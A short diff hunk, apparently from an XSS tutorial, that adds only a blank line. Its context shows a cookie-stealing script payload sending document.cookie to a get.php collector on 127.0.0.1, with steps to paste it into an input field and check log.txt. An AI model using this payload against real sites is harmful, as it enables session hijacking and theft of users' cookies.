@@ -71,6 +71,7 @@ YasserREED> sudo chmod 777 log.txt
     o.src="http://127.0.0.1/get.php?cookie="+document.cookie
 </script>
 
+
 2 - Paste in input filed.
 
 3 - Check log.txt //if not showen you can refresh the page 🔄
